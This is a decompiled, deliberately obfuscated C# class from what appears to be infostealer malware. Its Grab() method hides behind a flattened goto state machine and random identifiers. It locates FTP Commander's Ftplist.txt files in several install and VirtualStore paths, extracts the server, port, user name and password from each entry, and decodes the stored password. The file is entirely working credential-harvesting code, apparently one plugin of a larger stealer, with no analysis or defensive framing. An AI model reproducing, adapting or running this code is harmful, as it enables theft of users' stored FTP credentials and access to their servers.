using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using SNt;
using p3N5Y;
using q9Ep;

namespace ZAZUx;

public class B1cgpAQ : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string OOxXfm935Lp
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public B1cgpAQ()
	{
		OOxXfm935Lp = "FtpCommander";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		string[] array = default;
		string[] array2 = default;
		string[] array3 = default;
		string text = default;
		string cHkPxUTF = default;
		List<ii68> list = default;
		int num2 = default;
		string path = default;
		string[] array4 = default;
		int num3 = default;
		string pass = default;
		string[] array5 = default;
		string user = default;
		string text2 = default;
		string text3 = default;
		do
		{
			if (num == 15)
			{
				array = array2;
				num = 16;
			}
			if (num == 17)
			{
				goto IL_03fa;
			}
			if (num == 5)
			{
				array3[2] = Environment.GetEnvironmentVariable("SystemDrive") + "\\cftp\\Ftplist.txt";
				num = 6;
			}
			if (num == 19)
			{
				text = b4v.jCFtRv(cHkPxUTF, ";Password=", ";User=", 0);
				num = 20;
			}
			if (num == 20)
			{
				if (text.Length < 2)
				{
					goto IL_013d;
				}
				num = 21;
			}
			if (num == 11)
			{
				goto IL_03ae;
			}
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			if (num == 26)
			{
				goto IL_013d;
			}
			goto IL_0154;
			IL_013d:
			num2++;
			num = 27;
			goto IL_0154;
			IL_01f0:
			path = array4[num3];
			num = 13;
			goto IL_0206;
			IL_0154:
			if (num == 24)
			{
				pass = KKA.RdeE(text, 25);
				num = 25;
			}
			if (num == 14)
			{
				array2 = File.ReadAllLines(path);
				num = 15;
			}
			if (num == 3)
			{
				array3[0] = Environment.GetEnvironmentVariable("SystemDrive") + "\\Program Files (x86)\\FTP Commander Deluxe\\Ftplist.txt";
				num = 4;
			}
			if (num == 12)
			{
				goto IL_01f0;
			}
			goto IL_0206;
			IL_0359:
			if (num == 8)
			{
				array5 = array3;
				num = 9;
			}
			if (num == 9)
			{
				array4 = array5;
				num = 10;
			}
			if (num == 29)
			{
				goto IL_03ae;
			}
			goto IL_03c6;
			IL_029b:
			if (num == 6)
			{
				array3[3] = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\VirtualStore\\Program Files (x86)\\FTP Commander\\Ftplist.txt";
				num = 7;
			}
			if (num == 23)
			{
				user = b4v.jCFtRv(cHkPxUTF, ";User=", ";Anonymous=", 0);
				num = 24;
			}
			if (num == 2)
			{
				array3 = new string[5];
				num = 3;
			}
			if (num == 28)
			{
				goto IL_0342;
			}
			goto IL_0359;
			IL_03fa:
			if (num2 < array.Length)
			{
				goto IL_0285;
			}
			num = 28;
			goto IL_0412;
			IL_03c6:
			if (num == 10)
			{
				num3 = 0;
				num = 11;
			}
			if (num == 27)
			{
				goto IL_03fa;
			}
			goto IL_0412;
			IL_03ae:
			if (num3 < array4.Length)
			{
				goto IL_01f0;
			}
			num = 30;
			goto IL_03c6;
			IL_0206:
			if (num == 7)
			{
				array3[4] = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\VirtualStore\\Program Files (x86)\\FTP Commander Deluxe\\Ftplist.txt";
				num = 8;
			}
			if (num == 22)
			{
				text2 = b4v.jCFtRv(cHkPxUTF, ";Port=", ";Password=", 0);
				num = 23;
			}
			if (num == 18)
			{
				goto IL_0285;
			}
			goto IL_029b;
			IL_0285:
			cHkPxUTF = array[num2];
			num = 19;
			goto IL_029b;
			IL_0342:
			num3++;
			num = 29;
			goto IL_0359;
			IL_0412:
			if (num == 16)
			{
				num2 = 0;
				num = 17;
			}
			if (num == 21)
			{
				text3 = b4v.jCFtRv(cHkPxUTF, ";Server=", ";Port=", 0);
				num = 22;
			}
			if (num == 25)
			{
				list.Add(new ii68(text3 + ":" + text2, user, pass, OOxXfm935Lp));
				num = 26;
			}
			if (num == 4)
			{
				array3[1] = Environment.GetEnvironmentVariable("SystemDrive") + "\\Program Files (x86)\\FTP Commander\\Ftplist.txt";
				num = 5;
			}
			if (num == 13)
			{
				if (!File.Exists(path))
				{
					goto IL_0342;
				}
				num = 14;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 30);
		return list;
	}
}
